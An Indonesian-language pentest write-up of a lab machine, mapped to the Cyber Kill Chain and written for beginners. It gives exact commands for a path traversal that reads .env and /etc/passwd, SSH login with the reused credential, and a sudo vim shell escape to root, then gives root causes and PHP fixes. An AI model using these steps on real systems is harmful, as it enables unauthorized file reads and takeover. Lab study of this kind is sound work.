# Write-Up Lab Statute: Dari Reconnaissance, Menemukan Path Traversal, hingga Root

> **Target lab:** `192.168.56.120`  
> **Web utama:** `http://192.168.56.120:8080`  
> **Hostname:** `statute`  
> **Tujuan dokumen:** menjelaskan alur berpikir pentester pemula berdasarkan tahapan **Cyber Kill Chain**, bukan sekadar langsung memasukkan payload path traversal.  
> **Batasan:** hanya untuk lab atau sistem yang telah memberikan izin pengujian.

---

## 1. Ringkasan Serangan

Rangkaian kompromi pada lab ini adalah:

```text
Reconnaissance jaringan
→ menemukan SSH dan aplikasi web pada port 8080
→ enumerasi direktori dan fungsi aplikasi
→ menemukan endpoint download
→ mempelajari request download normal
→ mengidentifikasi parameter file
→ membuat baseline respons
→ menguji hipotesis path traversal
→ membaca file .env
→ menemukan username dan password
→ menghubungkan credential tersebut dengan service SSH
→ login sebagai operator
→ menjalankan enumerasi privilege lokal
→ menemukan sudo Vim
→ memanfaatkan shell escape Vim
→ memperoleh root
```

Versi singkat:

```text
Nmap
→ Dirsearch
→ Observasi fitur download
→ Baseline
→ ../.env
→ Credential reuse
→ SSH operator
→ sudo -l
→ sudo vim
→ root
```

Hal terpenting dari lab ini bukan menghafal `../.env`, melainkan memahami **mengapa endpoint download layak diuji**, **mengapa `.env` menjadi kandidat file**, dan **mengapa credential dari web kemudian dicoba pada SSH**.

---

# 2. Pemetaan ke Cyber Kill Chain

| Tahap Cyber Kill Chain | Implementasi pada Lab |
|---|---|
| 1. Reconnaissance | Memastikan host aktif, memindai port, mengidentifikasi service, teknologi web, dan endpoint |
| 2. Weaponization | Menyiapkan alat, wordlist, browser/proxy, command pencatatan, serta hipotesis uji; tidak membuat malware |
| 3. Delivery | Mengirim request HTTP normal ke aplikasi dan endpoint download |
| 4. Exploitation | Memanipulasi parameter `file` dengan traversal untuk membaca `.env` |
| 5. Installation | Tidak dilakukan; tidak memasang webshell, backdoor, atau persistence |
| 6. Command and Control | Akses interaktif dilakukan melalui SSH menggunakan credential yang ditemukan |
| 7. Actions on Objectives | Enumerasi lokal, identifikasi salah konfigurasi sudo, eskalasi privilege, dan validasi root |

Cyber Kill Chain awalnya menggambarkan serangan dunia nyata. Dalam pentest lab, beberapa tahap disesuaikan. **Weaponization** berarti menyiapkan alat dan skenario pengujian, sedangkan **Installation** sengaja dilewati karena tidak diperlukan untuk membuktikan dampak.

---

# 3. Persiapan Pengujian

## 3.1 Menentukan variabel target

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"
```

Dengan variabel tersebut, command berikutnya lebih mudah dibaca dan risiko salah ketik berkurang.

## 3.2 Membuat direktori evidence

```bash
mkdir -p statute-lab/{recon,web,evidence,notes}
cd statute-lab
```

Struktur sederhana:

```text
statute-lab/
├── recon/
├── web/
├── evidence/
└── notes/
```

Tujuannya bukan hanya kerapian. Pentester harus dapat menjelaskan:

```text
Apa yang diuji?
Kapan diuji?
Apa request-nya?
Apa responsnya?
Apa kesimpulan dari bukti tersebut?
```

## 3.3 Menetapkan prinsip pengujian

Pada tahap awal, gunakan pendekatan:

```text
observasi
→ buat hipotesis
→ uji dengan request paling ringan
→ bandingkan respons
→ simpulkan
```

Hindari langsung melakukan brute force atau mencoba banyak payload tanpa memahami fungsi aplikasi.

---

# 4. Cyber Kill Chain 1 — Reconnaissance

## 4.1 Memastikan target dapat dijangkau

```bash
ping -c 4 "$TARGET"
```

Interpretasi:

```text
Ada reply       → host kemungkinan aktif
Tidak ada reply → belum tentu mati; ICMP mungkin diblok
```

Karena itu, walaupun ping gagal, lanjutkan dengan Nmap menggunakan `-Pn`.

---

## 4.2 Scan port awal

```bash
nmap -Pn -sS -sV --top-ports 1000 "$TARGET" \
  -oN recon/nmap-top1000.txt
```

Tujuan scan awal:

```text
Mendapat gambaran cepat service yang terbuka
Menentukan port mana yang perlu diperiksa lebih dalam
Menghindari langsung berfokus pada satu aplikasi
```

Temuan penting pada lab:

```text
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http
```

### Alur berpikir

Dari tiga port tersebut, pentester membuat hipotesis:

| Temuan | Hipotesis Awal |
|---|---|
| Port 22 SSH | Bisa menjadi jalur initial access jika ditemukan credential atau key |
| Port 80 HTTP | Bisa hanya halaman default, reverse proxy, atau aplikasi lain |
| Port 8080 HTTP | Sering digunakan untuk aplikasi tambahan atau aplikasi utama lab |

Belum ada eksploitasi. Kita baru membuat peta permukaan serangan.

---

## 4.3 Scan detail seluruh port

```bash
nmap -Pn -sC -sV -p- --min-rate 1000 "$TARGET" \
  -oA recon/nmap-full
```

Penjelasan opsi:

```text
-Pn          : anggap host aktif walaupun ICMP tidak menjawab
-sC          : jalankan script default Nmap
-sV          : deteksi versi service
-p-          : scan seluruh 65535 port TCP
--min-rate   : mempercepat pengiriman probe pada jaringan lab
-oA          : menyimpan hasil dalam beberapa format
```

Dari hasil lab:

```text
22/tcp   OpenSSH
80/tcp   Apache HTTP Server
8080/tcp Apache HTTP Server
```

### Kesimpulan sementara

```text
Aplikasi web perlu diperiksa pada port 80 dan 8080.
SSH belum diserang; cukup dicatat sebagai peluang chaining jika credential ditemukan.
```

---

## 4.4 Membandingkan port 80 dan 8080

```bash
curl -i "http://$TARGET/" | tee web/port80-index.txt
curl -i "$WEB/" | tee web/port8080-index.txt
```

Yang diamati:

```text
Status code
Header Server
Judul halaman
Panjang response
Redirect
Cookie
Teknologi atau framework
```

Apabila port 80 hanya menampilkan halaman default Apache sedangkan port 8080 menampilkan aplikasi dokumen/peraturan, prioritas dialihkan ke port 8080.

---

## 4.5 Fingerprinting ringan dengan Nikto

```bash
nikto -h "$WEB" | tee recon/nikto-8080.txt
```

Nikto bukan alat untuk “menemukan semua celah”. Fungsinya di sini adalah menambah konteks:

```text
Header keamanan yang hilang
Method HTTP
Informasi server
File atau endpoint umum
```

Temuan Nikto tetap harus divalidasi manual karena scanner dapat menghasilkan false positive.

---

# 5. Cyber Kill Chain 2 — Weaponization

Pada lab ini tidak ada pembuatan malware. “Weaponization” diterjemahkan sebagai **menyiapkan cara pengujian yang terarah**.

## 5.1 Menyiapkan alat

```text
Nmap      → service enumeration
Curl      → membuat baseline dan menyimpan response
Dirsearch → content discovery
Burp Suite atau ZAP → melihat request dari browser
SSH       → validasi initial access jika credential ditemukan
```

## 5.2 Menyiapkan pertanyaan pengujian

Sebelum menjalankan dirsearch, pentester sebaiknya mempunyai pertanyaan:

```text
Apakah ada halaman admin?
Apakah ada endpoint download atau upload?
Apakah aplikasi menggunakan nama file langsung?
Apakah ada file konfigurasi atau backup yang terekspos?
Apakah ada parameter yang mengontrol lokasi file?
```

## 5.3 Menyiapkan wordlist extension

Karena aplikasi tampak menggunakan Apache/PHP, extension yang relevan:

```text
php, html, txt, bak, old, zip, env
```

Command:

```bash
dirsearch \
  -u "$WEB" \
  -e php,html,txt,bak,old,zip,env \
  --exclude-status 404 \
  -o recon/dirsearch-8080.txt
```

---

# 6. Cyber Kill Chain 3 — Delivery: Menemukan Titik Masuk Web

## 6.1 Membaca hasil directory enumeration

Temuan penting:

```text
/assets
/db.php
/documents
/download
/download.php
/files
/javascript
```

Endpoint yang menarik bukan dipilih secara acak.

### Mengapa `/download` menarik?

Karena fungsi download biasanya menerima salah satu bentuk input berikut:

```text
/download?id=17
/download?document=17
/download?file=laporan.pdf
/download?path=documents/laporan.pdf
```

Dua bentuk terakhir berisiko apabila input user langsung digabungkan dengan path filesystem.

---

## 6.2 Jangan langsung mengirim `../.env`

Langkah yang benar adalah memahami fungsi normal aplikasi.

Buka aplikasi dari browser:

```text
http://192.168.56.120:8080
```

Lalu lakukan:

```text
1. Buka daftar dokumen.
2. Pilih satu dokumen publik.
3. Klik tombol Download.
4. Tangkap request menggunakan Burp Suite/ZAP atau Developer Tools.
```

Request normal yang terlihat misalnya:

```http
GET /download?file=uu-1-2024.pdf HTTP/1.1
Host: 192.168.56.120:8080
```

Dari request itu, pentester memperoleh petunjuk terpenting:

```text
Nama parameter : file
Nilai parameter: nama file secara langsung
```

Inilah asal mula dugaan path traversal.

---

## 6.3 Mengapa parameter `file` mencurigakan?

Parameter berikut tidak otomatis rentan:

```text
file=uu-1-2024.pdf
```

Namun ia menimbulkan hipotesis bahwa backend mungkin melakukan:

```php
$path = "/var/www/app/documents/" . $_GET["file"];
readfile($path);
```

Jika tidak ada normalisasi dan validasi, input:

```text
../.env
```

dapat mengubah path menjadi:

```text
/var/www/app/documents/../.env
```

Filesystem menyederhanakannya menjadi:

```text
/var/www/app/.env
```

Pada tahap ini celah belum terbukti. Kita baru mempunyai **hipotesis berdasarkan bentuk request**.

---

# 7. Membuat Baseline sebelum Pengujian

Baseline sangat penting agar pentester tidak keliru menyimpulkan respons `200`, `404`, atau halaman error sebagai keberhasilan.

## 7.1 Baseline A — File valid

Gunakan nama file yang benar-benar tersedia dari halaman aplikasi:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=uu-1-2024.pdf" \
  | tee web/baseline-valid.txt
```

Hasil yang diharapkan:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="uu-1-2024.pdf"
Content-Type: application/pdf
```

Kesimpulan:

```text
Endpoint dan parameter file bekerja untuk file yang sah.
```

---

## 7.2 Baseline B — File tidak ada

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=missing.pdf" \
  | tee web/baseline-missing.txt
```

Hasil:

```text
HTTP/1.1 404 Not Found
Berkas tidak ditemukan.
```

Kesimpulan:

```text
Aplikasi membedakan file valid dan file tidak ada.
```

---

## 7.3 Baseline C — Request tanpa parameter

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download" \
  | tee web/baseline-no-parameter.txt
```

Kemungkinan hasil:

```text
400 Bad Request
```

Kesimpulan:

```text
Endpoint memang memerlukan parameter.
Status 400 dari hasil dirsearch bukan berarti endpoint palsu.
```

---

## 7.4 Tabel pembanding

| Skenario | Input | Ekspektasi |
|---|---|---|
| File sah | `file=uu-1-2024.pdf` | `200`, file PDF |
| File tidak ada | `file=missing.pdf` | `404` |
| Tanpa parameter | tidak ada `file` | `400` |
| Traversal berhasil | `file=../.env` | `200`, isi `.env` |

Dengan baseline ini, keberhasilan traversal tidak dinilai hanya berdasarkan status code, tetapi juga berdasarkan:

```text
Content-Disposition
Nama file
Content-Type
Isi body
Perbedaan dengan respons error
```

---

# 8. Dari Pengamatan ke Hipotesis Celah

Pentester dapat menyusun beberapa hipotesis terhadap parameter `file`.

| Hipotesis | Contoh uji awal | Prioritas |
|---|---|---|
| File tidak ada | `missing.pdf` | Wajib sebagai baseline |
| Path traversal | `../.env` | Tinggi karena input berupa nama file |
| Absolute path | `/etc/passwd` | Menengah, setelah traversal relatif |
| Extension restriction | `test.txt`, `test.pdf` | Menengah |
| SQL injection | karakter kutip pada parameter | Rendah, karena parameter tampak digunakan sebagai path |
| Command injection | metacharacter shell | Rendah, tidak ada indikasi backend menjalankan command |

### Pelajaran

Pemilihan payload harus mengikuti konteks.

```text
Parameter pencarian → pikirkan SQL/NoSQL injection
Parameter URL       → pikirkan SSRF/open redirect
Parameter file/path → pikirkan traversal/LFI
Parameter command   → pikirkan command injection
```

Karena parameter bernama `file` berisi nama file lengkap, path traversal menjadi hipotesis paling logis.

---

# 9. Cyber Kill Chain 4 — Exploitation: Validasi Path Traversal

## 9.1 Uji traversal satu tingkat

File `.env` dipilih karena:

```text
Aplikasi tampak berbasis PHP
File `.env` sering ditempatkan di root project
Folder download biasanya berada satu tingkat di bawah root project
File tersebut dapat berisi konfigurasi database
```

Request:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64)' \
  "$WEB/download?file=../.env" \
  | tee evidence/path-traversal-env.txt
```

Hasil terkonfirmasi pada lab:

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=[REDACTED]
DB_DATABASE=jdih
```

### Mengapa ini membuktikan path traversal?

Karena:

```text
1. Request normal hanya seharusnya mengakses dokumen publik.
2. `.env` bukan dokumen publik yang tersedia pada daftar download.
3. Input memakai `../` untuk keluar dari direktori dokumen.
4. Server mengembalikan isi file konfigurasi aplikasi.
```

---

## 9.2 Validasi alias endpoint

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download.php?file=../.env" \
  | tee evidence/path-traversal-env-download-php.txt
```

Jika respons sama, kemungkinan `/download` merupakan rewrite atau alias dari `download.php`.

---

## 9.3 Validasi encoded traversal

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=..%2F.env" \
  | tee evidence/path-traversal-env-encoded.txt
```

`%2F` adalah URL encoding untuk `/`.

Hasil ini menunjukkan bahwa backend atau web server melakukan decoding sebelum menggunakan nilai sebagai path.

---


## 9.4 Validasi pembacaan file sistem dengan Burp Repeater

Setelah pembacaan `.env` berhasil, dilakukan satu pengujian tambahan untuk memastikan bahwa kelemahan tidak hanya terbatas pada file konfigurasi aplikasi. Request normal dikirim ke **Burp Suite Repeater**, kemudian nilai parameter `file` diganti dengan beberapa rangkaian `../` hingga mengarah ke `/etc/passwd`.

### Raw request

```http
GET /download?file=../../../../../etc/passwd HTTP/1.1
Host: 192.168.56.120:8080
Accept-Language: en-GB,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.120:8080/documents?type=Perpres
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### Hasil terkonfirmasi

```text
HTTP/1.1 200 OK
Server: Apache
Content-Disposition: attachment; filename="passwd"
Content-Type: application/octet-stream
Content-Length: 1930

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

![Bukti Burp Repeater pembacaan file /etc/passwd](evidence/path-traversal-etc-passwd-burp.png)

### Analisis hasil

Pengujian ini memperkuat bukti bahwa parameter `file` tidak dibatasi hanya pada direktori dokumen. Aplikasi mengikuti traversal hingga mencapai file sistem `/etc/passwd`, lalu mengembalikannya sebagai attachment bernama `passwd`.

`/etc/passwd` pada Linux modern umumnya tidak menyimpan hash password, tetapi file ini tetap relevan sebagai bukti karena:

```text
File berada jauh di luar direktori dokumen aplikasi
Respons berstatus 200 OK
Nama attachment berubah menjadi passwd
Body berisi struktur akun lokal Linux
```

Dengan demikian, temuan lebih tepat dikategorikan sebagai:

```text
Path Traversal / Arbitrary File Read
```

dengan batas bahwa file yang dapat dibaca tetap bergantung pada permission user proses web server.

### Catatan pengujian

Pengujian dihentikan setelah bukti minimum terpenuhi. Tidak dilakukan pembacaan `/etc/shadow`, private key, token, atau file sensitif lain yang tidak diperlukan untuk membuktikan kerentanan.

---

## 9.5 Mengapa memakai `--path-as-is`?

Curl dapat melakukan normalisasi tertentu pada URL. Opsi:

```bash
--path-as-is
```

meminta curl mengirim path sebagaimana ditulis. Ini membantu saat menguji karakter traversal dan menghindari perubahan request oleh client.

---

## 9.6 Validasi yang aman

Cukup buktikan dengan file yang relevan dan minimum:

```text
.env
```

Tidak perlu langsung membaca:

```text
/etc/shadow
private key user
seluruh source code
backup database
```

Prinsip pentest:

```text
Bukti minimum yang cukup
lebih baik daripada
pengambilan data sebanyak-banyaknya
```

---

# 10. Analisis Mengapa `.env` Dapat Terbaca

Kemungkinan struktur aplikasi:

```text
/var/www/statute/
├── .env
├── download.php
├── db.php
├── documents/
│   ├── uu-1-2024.pdf
│   └── dokumen-lain.pdf
└── assets/
```

Kemungkinan kode rentan:

```php
<?php
$file = $_GET['file'];
$path = __DIR__ . '/documents/' . $file;

if (file_exists($path)) {
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    readfile($path);
} else {
    http_response_code(404);
    echo 'Berkas tidak ditemukan.';
}
```

Saat input normal:

```text
documents/uu-1-2024.pdf
```

Saat input traversal:

```text
documents/../.env
```

Hasil canonical path:

```text
/var/www/statute/.env
```

Bug terjadi karena aplikasi hanya memeriksa `file_exists()`, tetapi tidak memastikan bahwa resolved path tetap berada di dalam folder `documents`.

---

# 11. Dari File Disclosure ke Initial Access

## 11.1 Jangan langsung mencoba semua service

Isi `.env` menunjukkan:

```text
DB_USERNAME=operator
DB_PASSWORD=[REDACTED]
DB_DATABASE=jdih
```

Secara definisi, itu adalah credential database. Belum tentu merupakan akun Linux.

Namun hasil reconnaissance sebelumnya menunjukkan:

```text
22/tcp open ssh
```

Sekarang ada hubungan antar-temuan:

```text
Nmap menemukan SSH
+
Path traversal menemukan username dan password
=
Hipotesis credential reuse pada SSH
```

Ini bukan brute force. Pentester hanya memvalidasi **satu pasangan credential yang ditemukan dari aplikasi**.

---

## 11.2 Menilai apakah username masuk akal

Username seperti:

```text
operator
admin
deploy
backup
developer
```

lebih mungkin digunakan juga sebagai akun sistem dibanding username database generik seperti:

```text
app_db_prod
mysql_reader
reporting_ro
```

Karena username pada lab adalah `operator`, hipotesis reuse pada SSH menjadi cukup kuat untuk diuji.

---

## 11.3 Validasi SSH secara terkontrol

```bash
ssh operator@"$TARGET"
```

Pada koneksi pertama:

```text
Are you sure you want to continue connecting (yes/no/[fingerprint])?
```

Jawab:

```text
yes
```

Masukkan password yang ditemukan dari `.env` tanpa menuliskannya ke command history.

### Hindari cara berikut

```bash
sshpass -p 'PASSWORD' ssh operator@192.168.56.120
```

Alasannya:

```text
Password dapat tersimpan pada shell history
Password dapat terlihat pada process list
Evidence dapat membocorkan secret
```

---

## 11.4 Hasil initial access

Setelah login:

```bash
whoami
id
hostname
pwd
```

Hasil penting:

```text
operator
uid=... (operator)
statute
/home/operator
```

Kesimpulan:

```text
Credential database digunakan ulang untuk akun SSH.
Initial access berhasil sebagai user operator.
```

---

# 12. Cyber Kill Chain 5 — Installation

Tahap Installation tidak diperlukan.

Tidak dilakukan:

```text
Upload webshell
Membuat user baru
Menambahkan SSH key
Memasang service
Membuat cron persistence
Mengubah startup script
```

Dokumentasikan:

```text
Installation phase skipped.
Tidak ada malware, backdoor, atau persistence yang dipasang.
```

---

# 13. Cyber Kill Chain 6 — Command and Control

Dalam serangan nyata, C2 biasanya berupa callback malware atau kanal tersembunyi.

Pada lab ini, akses interaktif menggunakan:

```bash
ssh operator@192.168.56.120
```

digunakan sebagai kanal administrasi untuk melanjutkan validasi. Tidak ada callback, listener reverse shell, atau infrastruktur C2 eksternal.

---

# 14. Cyber Kill Chain 7 — Actions on Objectives: Local Enumeration

Setelah memperoleh shell, jangan langsung mencoba exploit kernel. Lakukan enumerasi dari yang paling sederhana dan paling relevan.

## 14.1 Konfirmasi konteks user

```bash
whoami
id
groups
hostname
pwd
```

Pertanyaan yang dijawab:

```text
Siapa user saat ini?
Masuk grup apa?
Berada pada host mana?
Apakah shell berada di home directory?
```

---

## 14.2 Melihat file pada home directory

```bash
ls -la
```

Pada lab terdapat file flag:

```bash
cat FLAG.txt
```

Flag hanya membuktikan bahwa user `operator` berhasil diakses. Jangan menganggap membaca flag sama dengan memperoleh root.

---

## 14.3 Memeriksa informasi sistem

```bash
uname -a
cat /etc/os-release
```

Tujuan:

```text
Mengetahui distribusi dan kernel
Membantu troubleshooting
Menjadi data cadangan jika tidak ada misconfiguration sederhana
```

Kernel exploit bukan pilihan pertama karena lebih berisiko dan sering tidak diperlukan.

---

## 14.4 Memeriksa sudo

Command prioritas:

```bash
sudo -l
```

`sudo -l` menjawab:

```text
Command apa yang boleh dijalankan user ini?
Sebagai user siapa command dijalankan?
Apakah password diperlukan?
Apakah ada wildcard atau argument yang dapat dikendalikan?
```

Pada lab, user `operator` dapat menjalankan Vim sebagai root.

Contoh pola output:

```text
User operator may run the following commands on statute:
    (root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

---

# 15. Menganalisis Temuan Sudo Vim

## 15.1 Mengapa editor teks dapat berbahaya?

Vim bukan sekadar editor. Vim dapat menjalankan command sistem melalui:

```vim
:!command
```

Jika Vim dijalankan sebagai root:

```bash
sudo vim
```

maka command yang dipanggil dari dalam Vim juga dapat mewarisi privilege root.

Alur privilege:

```text
operator menjalankan sudo
→ sudo membuka /usr/bin/vim sebagai root
→ Vim menjalankan /bin/sh
→ shell berjalan dengan privilege root
```

---

## 15.2 Validasi privilege escalation

Command yang digunakan pada lab:

```bash
sudo vim -c ':!/bin/sh'
```

Penjelasan:

```text
sudo          → menjalankan program sebagai root
vim           → binary yang diizinkan oleh sudoers
-c            → menjalankan command Vim saat startup
:!            → shell escape Vim
/bin/sh       → membuka shell sistem
```

Setelah shell terbuka:

```bash
whoami
id
```

Hasil:

```text
root
uid=0(root) gid=0(root) groups=0(root)
```

`uid=0(root)` adalah bukti final bahwa privilege escalation berhasil.

---

## 15.3 Alternatif interaktif untuk memahami proses

Jalankan:

```bash
sudo vim
```

Di dalam Vim, ketik:

```vim
:!/bin/sh
```

Kemudian:

```bash
whoami
id
```

Cara ini lebih mudah dipahami pemula karena terlihat jelas bahwa shell dipanggil dari dalam editor.

---

## 15.4 Keluar dengan benar

Keluar dari shell:

```bash
exit
```

Kemudian keluar dari Vim tanpa menyimpan:

```vim
:q!
```

Jangan meninggalkan perubahan file yang tidak diperlukan.

---

# 16. Decision Tree dari Web hingga Root

```text
[Port 8080 terbuka]
        |
        v
[Apakah ada fungsi yang menerima input user?]
        |
        +--> Search parameter?  → uji injection sesuai konteks
        |
        +--> URL parameter?     → uji SSRF/open redirect sesuai konteks
        |
        +--> File parameter?    → cek download/upload/path handling
                                  |
                                  v
                         [Temukan file=nama.pdf]
                                  |
                                  v
                      [Buat baseline valid dan invalid]
                                  |
                                  v
                      [Uji traversal relatif ../]
                                  |
                    +-------------+-------------+
                    |                           |
                  gagal                       berhasil
                    |                           |
         coba encoding/kedalaman         baca file minimum
         atau simpulkan terfilter        yang relevan (.env)
                                                |
                                                v
                                  [Credential ditemukan]
                                                |
                                  +-------------+-------------+
                                  |                           |
                             DB port terbuka              SSH terbuka
                                  |                           |
                           validasi DB secara          uji satu credential
                           read-only bila scope        secara terkontrol
                                                              |
                                                              v
                                                    [Login operator]
                                                              |
                                                              v
                                                       [sudo -l]
                                                              |
                                          +-------------------+-------------------+
                                          |                                       |
                                      tidak ada                                sudo vim
                                          |                                       |
                              cek SUID/capability/cron                            v
                              service/file writable                    [shell escape Vim]
                                                                                  |
                                                                                  v
                                                                               root
```

---

# 17. Catatan “Menebak” yang Benar

Pentester memang sering tampak seperti menebak. Namun tebakan yang baik adalah **hipotesis berbasis bukti**.

## 17.1 Contoh tebakan buruk

```text
Langsung mengirim ratusan payload acak
Mencoba SQL injection pada semua parameter
Mencoba reverse shell sebelum ada RCE
Mencoba exploit kernel sebelum menjalankan sudo -l
```

## 17.2 Contoh hipotesis yang baik

```text
Temuan:
Request download memakai file=nama.pdf

Hipotesis:
Backend mungkin menggabungkan input ke path filesystem

Uji:
Bandingkan file sah, file tidak ada, dan ../.env

Kesimpulan:
Traversal terbukti jika file di luar folder download dikembalikan
```

Contoh lain:

```text
Temuan:
.env mengandung username operator dan port 22 terbuka

Hipotesis:
Credential digunakan ulang pada akun SSH

Uji:
Satu kali login dengan pasangan credential tersebut

Kesimpulan:
Credential reuse terbukti jika login berhasil
```

Dengan cara ini, setiap langkah dapat dipertanggungjawabkan.

---

# 18. Log Keputusan Pengujian

| No. | Bukti | Dugaan | Uji Berikutnya | Hasil |
|---:|---|---|---|---|
| 1 | Host merespons dan port 8080 terbuka | Ada aplikasi web non-default | Buka port 8080 | Aplikasi dokumen ditemukan |
| 2 | Dirsearch menemukan `/download` | Endpoint membutuhkan parameter | Akses tanpa parameter | Respons 400 |
| 3 | Tombol download mengirim `file=nama.pdf` | Input mungkin dipakai sebagai path | Buat baseline valid/missing | Pola 200 dan 404 terbentuk |
| 4 | Parameter menerima nama file langsung | Ada kemungkinan traversal | Uji `../.env` | `.env` terbaca |
| 5 | Traversal satu tingkat berhasil | Aplikasi mungkin dapat membaca file di luar project | Uji terbatas ke `/etc/passwd` melalui Burp Repeater | File sistem terbaca dengan `200 OK` |
| 6 | `.env` berisi user `operator` | Credential mungkin dipakai ulang | Hubungkan dengan port SSH | Login SSH berhasil |
| 7 | Shell sebagai operator | Mungkin ada sudo misconfiguration | Jalankan `sudo -l` | Vim dapat dijalankan sebagai root |
| 8 | Vim mendukung shell escape | Dapat membuka shell root | Jalankan shell dari Vim | `uid=0(root)` |

---

# 19. Troubleshooting untuk Pentester Pemula

## 19.1 Dirsearch menampilkan `400` pada `/download`

Itu tidak selalu berarti endpoint rusak.

Kemungkinan:

```text
Endpoint ada tetapi parameter wajib belum diberikan.
```

Cari bentuk request normal dari tombol download di browser.

---

## 19.2 Curl mendapat 403 tetapi browser berhasil

Coba gunakan User-Agent browser:

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64)' \
  "$WEB/download?file=../.env"

# Validasi tambahan yang setara dengan request Burp Repeater
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)' \
  "$WEB/download?file=../../../../../etc/passwd"
```

Bandingkan juga cookie dan header dari request browser.

---

## 19.3 `../.env` menghasilkan 404

Kemungkinan:

```text
File tidak berada satu tingkat di atas
Input sudah dinormalisasi
Aplikasi menambahkan extension
Traversal diblok
Endpoint yang digunakan berbeda
```

Uji secara terbatas:

```text
../../.env
../config.php
..%2F.env
```

Jangan melakukan fuzzing file sensitif secara massal tanpa kebutuhan.

---

## 19.4 Respons 200 tetapi bukan isi file

Periksa:

```text
Apakah body adalah halaman error?
Apakah Content-Disposition berubah?
Apakah panjang respons sama dengan baseline?
Apakah aplikasi selalu mengembalikan 200?
```

Status `200` saja bukan bukti.

---

## 19.5 Credential `.env` gagal untuk SSH

Kemungkinan:

```text
Credential hanya untuk database
Password sudah berubah
SSH password authentication dinonaktifkan
Username sistem berbeda
Akun terkunci
```

Jangan melakukan brute force. Kembali ke evidence dan cari jalur lain yang masih sesuai scope.

---

## 19.6 `sudo -l` meminta password

Gunakan password akun `operator` yang valid. Ini berbeda dengan `NOPASSWD`.

---

## 19.7 `sudo vim` tidak diizinkan

Baca output `sudo -l` secara tepat. Sudoers dapat membatasi:

```text
Path binary
Argument tertentu
User tujuan
Environment
```

Jangan mengasumsikan semua bentuk command Vim diizinkan.

---

## 19.8 Shell terbuka tetapi `whoami` bukan root

Periksa:

```bash
id
```

Kemungkinan command tidak benar-benar dijalankan melalui sudo, atau aturan sudo hanya mengizinkan user non-root tertentu.

---

# 20. Evidence yang Perlu Disimpan

```text
recon/nmap-full.nmap
recon/nikto-8080.txt
recon/dirsearch-8080.txt
web/baseline-valid.txt
web/baseline-missing.txt
web/baseline-no-parameter.txt
evidence/path-traversal-env.txt
evidence/path-traversal-env-download-php.txt
evidence/path-traversal-env-encoded.txt
evidence/path-traversal-etc-passwd.txt
evidence/path-traversal-etc-passwd-burp.png
screenshot request download normal
screenshot respons .env yang sudah disensor
screenshot login SSH
output sudo -l
output whoami dan id setelah privesc
```

Saat membuat laporan, redaksikan:

```text
Password
Token
Private key
Session cookie
Flag apabila tidak perlu dipublikasikan
```

---

# 21. Root Cause Analysis

## 21.1 Path traversal

Aplikasi menggunakan input `file` untuk membentuk path tanpa memastikan resolved path tetap berada di direktori dokumen.

## 21.2 Secret disimpan pada file yang dapat dijangkau logic download

File `.env` berada dekat dengan direktori aplikasi dan dapat dibaca oleh user web server.

## 21.3 Credential reuse

Password database dipakai ulang untuk akun Linux `operator`.

## 21.4 Sudoers terlalu permisif

User `operator` diizinkan menjalankan Vim sebagai root. Vim mempunyai shell escape sehingga izin tersebut setara dengan akses shell root.

## 21.5 Kegagalan berlapis

Tidak satu pun temuan berdiri sendiri langsung menghasilkan root:

```text
Traversal tanpa secret reuse → mungkin hanya disclosure
Secret tanpa SSH terbuka     → belum tentu initial access
SSH operator tanpa sudo Vim  → belum tentu root
Sudo Vim tanpa foothold      → belum dapat digunakan
```

Kompromi penuh terjadi karena beberapa kontrol gagal sekaligus.

---

# 22. Rekomendasi Perbaikan

## 22.1 Jangan gunakan path dari input user

Gunakan ID dokumen:

```text
/download?id=1042
```

Server memetakan ID ke filename dari database.

---

## 22.2 Terapkan allowlist

Contoh konsep PHP:

```php
$allowed = [
    'uu-1-2024.pdf',
    'perpres-10-2024.pdf'
];

$file = $_GET['file'] ?? '';

if (!in_array($file, $allowed, true)) {
    http_response_code(400);
    exit('Invalid file');
}
```

---

## 22.3 Verifikasi canonical path

```php
$base = realpath(__DIR__ . '/documents');
$file = $_GET['file'] ?? '';
$resolved = realpath($base . DIRECTORY_SEPARATOR . $file);

if ($resolved === false ||
    !str_starts_with($resolved, $base . DIRECTORY_SEPARATOR) ||
    !is_file($resolved)) {
    http_response_code(404);
    exit('Berkas tidak ditemukan.');
}

readfile($resolved);
```

Pemeriksaan prefix harus menggunakan separator agar path seperti:

```text
/var/www/app/documents-backup
```

tidak keliru dianggap berada di dalam:

```text
/var/www/app/documents
```

---

## 22.4 Lindungi secret

```text
Rotasi password database
Rotasi password akun operator
Gunakan secret manager atau environment service
Batasi permission `.env`
Jangan gunakan secret yang sama pada beberapa service
```

---

## 22.5 Perbaiki sudoers

Hapus izin:

```text
operator ALL=(root) /usr/bin/vim
```

